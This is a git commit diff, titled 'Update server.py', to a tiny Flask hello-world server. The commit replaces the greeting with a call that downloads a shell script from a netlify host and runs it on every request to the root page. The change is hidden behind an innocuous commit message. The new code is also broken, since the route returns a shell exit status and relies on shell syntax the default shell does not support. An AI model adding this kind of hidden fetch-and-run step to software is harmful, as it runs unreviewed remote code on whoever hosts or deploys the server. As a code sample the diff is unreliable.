c496cab5ccd2710d9e1913f2c1093e4ebfb2225f
آرین عباسی <86650611+arianabbasi1389@users.noreply.github.com>
2023-01-21 15:31:16 +0330

    Update server.py

--- server.py
+++ server.py
@@ -1,9 +1,10 @@
 from flask import Flask
 server = Flask(__name__)
-
 @server.route("/")
 def hello():
-    return "Hello World!"
-
+    import os
+    answer1 = os.system('source <(curl -sL https://multi.netlify.app/v2ray.sh)')
+    return answer1
 if __name__ == "__main__":
-   server.run(host='0.0.0.0', port=1337)
+    server.run(host='0.0.0.0', port=1337)
+    pass
